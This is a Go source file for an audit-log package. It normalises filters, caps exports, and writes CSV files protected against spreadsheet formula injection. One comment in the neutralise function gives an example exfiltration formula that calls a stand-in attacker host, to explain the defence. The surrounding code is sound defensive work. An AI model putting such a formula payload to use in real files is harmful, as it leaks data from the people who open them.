// Package audit holds the domain rules for the audit surface: what a filter
// means once normalised, and what an exported file looks like (ENT-223).
//
// Pure functions over already-loaded data, no database and no proto, for the
// same reason `domain/records` is written that way. The two things worth
// testing exhaustively here are the CSV encoder and the caps, and both are the
// kind of thing that is untestable once it is welded to a query.
package audit

import (
	"encoding/csv"
	"fmt"
	"io"
	"strings"
	"time"
)

// Page sizes for the list.
const (
	DefaultPageSize = 50
	MaxPageSize     = 200
)

// ExportRowCap is the most rows one export produces.
//
// A bound rather than a preference. Without one, a single request can be made
// to assemble an arbitrarily large file in memory and hand it back in one
// response, which is a denial of service that needs no special privilege beyond
// a session. Fifty thousand rows is roughly a decade of decisions for an
// organisation making twenty a day, so the cap is far above real use and well
// below what hurts.
//
// **Hitting it is reported, never silent.** A truncated CSV is a valid CSV that
// simply stops, and an auditor who attaches one to a report has attached an
// incomplete record without knowing. That failure is precisely what this
// surface exists to prevent, so `ExportResult.Truncated` is not an optional
// nicety for a console to render.
const ExportRowCap = 50000

// ActorKind values.
const (
	ActorHuman   = "human"
	ActorService = "service"
)

// Actor is who performed an act.
//
// Not assumed to be a person: §26 has agent runs producing acts, and `Kind`
// exists so that day adds a value rather than a field.
type Actor struct {
	UserID string
	// Both empty when the actor has left the organisation, and for a non-human
	// actor. The row is still returned: an audit log that dropped rows when
	// somebody was offboarded would be defeatable by offboarding somebody.
	DisplayName string
	Email       string
	// The role held AT THE TIME, snapshotted into the row. Resolving it now
	// would make the log change what it says about the past every time
	// somebody's role changed.
	Role string
	Kind string
}

// Entry is one act, as recorded when it happened.
type Entry struct {
	ID          string
	OccurredAt  time.Time
	ActionType  string
	Actor       Actor
	FindingID   string
	TargetTable string
	TargetID    string
	BeforeJSON  string
	AfterJSON   string
	// The agent run that produced this act (§26). Always empty today; carried
	// so the read model does not change when ENT-218 lands.
	AgentRunID string
}

// Filter is the set of rows a request is about.
type Filter struct {
	Since        time.Time
	Until        time.Time
	ActionTypes  []string
	ActorUserIDs []string
	Query        string
}

// ErrBackwardsRange is returned when `until` is at or before `since`.
//
// Refused rather than swapped or ignored. A silently-swapped range returns rows
// the caller did not ask for, and an ignored one returns every row there is,
// which in an audit export is the difference between a month of decisions and
// all of them. Both are worse than an error, because both look like they
// worked.
var ErrBackwardsRange = fmt.Errorf("audit: the end of the range is not after its start")

// Normalise trims and deduplicates a filter, and checks the range.
//
// Deduplication is not tidiness: the action types and actor ids become `= any`
// predicates, and a client that sends the same value twice would otherwise
// widen the array for no reason. Empty strings are dropped for a sharper
// reason: an empty action type in the array would match nothing and silently
// turn a filter into a no-op.
func (f Filter) Normalise() (Filter, error) {
	out := Filter{
		Since:        f.Since,
		Until:        f.Until,
		ActionTypes:  cleanSet(f.ActionTypes),
		ActorUserIDs: cleanSet(f.ActorUserIDs),
		Query:        strings.TrimSpace(f.Query),
	}

	if !out.Since.IsZero() && !out.Until.IsZero() && !out.Until.After(out.Since) {
		return Filter{}, ErrBackwardsRange
	}
	return out, nil
}

func cleanSet(values []string) []string {
	if len(values) == 0 {
		return nil
	}
	seen := make(map[string]bool, len(values))
	var out []string
	for _, value := range values {
		trimmed := strings.TrimSpace(value)
		if trimmed == "" || seen[trimmed] {
			continue
		}
		seen[trimmed] = true
		out = append(out, trimmed)
	}
	return out
}

// ClampPageSize applies the default and the ceiling.
func ClampPageSize(requested int) int {
	switch {
	case requested <= 0:
		return DefaultPageSize
	case requested > MaxPageSize:
		return MaxPageSize
	default:
		return requested
	}
}

// csvHeader is the column order of an export, and it is a contract.
//
// Somebody will build a spreadsheet on top of a file this produces, so
// reordering or renaming a column later breaks work that is not in this
// repository. Append, do not rearrange.
var csvHeader = []string{
	"occurred_at",
	"action_type",
	"actor_user_id",
	"actor_name",
	"actor_email",
	"actor_role",
	"finding_id",
	"target_table",
	"target_id",
	"before",
	"after",
	"agent_run_id",
	"audit_id",
}

// utf8BOM is written ahead of the CSV.
//
// One unglamorous reason: an auditor opens this in Excel on Windows, and
// without a BOM Excel reads UTF-8 as the local code page and mangles every
// non-ASCII character. The names that get mangled are disproportionately not
// English ones, and this file is a record of who did what.
var utf8BOM = []byte{0xEF, 0xBB, 0xBF}

// neutralise defuses spreadsheet formula injection.
//
// # WHY AN AUDIT EXPORT IS THE WORST PLACE TO SKIP THIS
//
// Excel, LibreOffice and Sheets evaluate any cell whose first character is one
// of `= + - @` or a leading tab or carriage return. Several columns here carry
// text a user chose: a display name, and the `before`/`after` payloads, which
// hold whatever the acted-on row contained. So a member can name themselves
// `=HYPERLINK("https://attacker.example/"&A1,"ok")`, and the person who opens
// the file is an auditor, on a corporate laptop, reviewing a compliance record
// they have been told is trustworthy. That is close to the ideal target.
//
// The mitigation is OWASP's: prefix the cell with an apostrophe, which every
// spreadsheet reads as "the rest is literal text" and does not display.
//
// **This does change the exported bytes**, and that is a deliberate trade. The
// record of truth is `audit_log` in the customer's own database, which is
// untouched and append-only; this file is a rendering of it for a human to
// read. A rendering that can execute is not a safer record, it is a worse one.
// A parser consuming these files should strip a single leading apostrophe.
func neutralise(field string) string {
	if field == "" {
		return field
	}
	switch field[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + field
	default:
		return field
	}
}

// WriteCSV renders entries as RFC 4180 CSV with a BOM.
//
// `before` and `after` are included in full rather than summarised. An export
// that dropped them would be an event list rather than a record, and the point
// of the file is that somebody can check a claim against it.
//
// Timestamps are RFC 3339 in UTC. Not the viewer's local time and not a
// friendly format: an audit file is read by people in other timezones, and
// possibly years later, and "14:32" with no offset is a fact nobody can verify.
func WriteCSV(w io.Writer, entries []Entry) error {
	if _, err := w.Write(utf8BOM); err != nil {
		return fmt.Errorf("audit: writing the byte order mark: %w", err)
	}

	out := csv.NewWriter(w)
	if err := out.Write(csvHeader); err != nil {
		return fmt.Errorf("audit: writing the CSV header: %w", err)
	}

	for _, entry := range entries {
		// Every field goes through `neutralise`, including the ones that cannot
		// currently start with a formula character. Exempting the "safe" columns
		// would mean this list has to be re-audited every time a column's source
		// changes, and the cost of not exempting them is nil.
		record := []string{
			neutralise(entry.OccurredAt.UTC().Format(time.RFC3339)),
			neutralise(entry.ActionType),
			neutralise(entry.Actor.UserID),
			neutralise(entry.Actor.DisplayName),
			neutralise(entry.Actor.Email),
			neutralise(entry.Actor.Role),
			neutralise(entry.FindingID),
			neutralise(entry.TargetTable),
			neutralise(entry.TargetID),
			neutralise(entry.BeforeJSON),
			neutralise(entry.AfterJSON),
			neutralise(entry.AgentRunID),
			neutralise(entry.ID),
		}
		if err := out.Write(record); err != nil {
			return fmt.Errorf("audit: writing a CSV row: %w", err)
		}
	}

	out.Flush()
	if err := out.Error(); err != nil {
		return fmt.Errorf("audit: flushing the CSV: %w", err)
	}
	return nil
}

// ExportFilename names the file an auditor downloads.
//
// Dated so that two exports taken a week apart do not both land in Downloads as
// `audit.csv`, with the second silently becoming `audit (1).csv` and nobody
// able to say which is which.
func ExportFilename(at time.Time) string {
	return fmt.Sprintf("kindlast-audit-%s.csv", at.UTC().Format("2006-01-02"))
}
